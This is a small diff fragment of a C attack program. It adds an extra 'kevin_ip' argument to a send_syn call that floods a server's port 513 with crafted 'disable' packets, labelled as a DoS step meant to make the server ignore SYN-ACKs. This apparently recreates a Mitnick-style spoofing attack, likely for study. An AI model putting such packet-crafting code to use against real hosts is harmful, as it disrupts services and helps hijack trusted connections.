@@ -62,7 +62,7 @@ int main (void)
 	{
 		//craft and send 10 packets with "disable" payload
 		printf("dos\n");
-		send_syn(513, (uint8_t *) disable, (u_short) strlen(disable), l, server_ip);
+		send_syn(513, (uint8_t *) disable, (u_short) strlen(disable), l, server_ip, kevin_ip);
 	}
 	//now the server will ignore syn acks, that's exactly what I need because
 
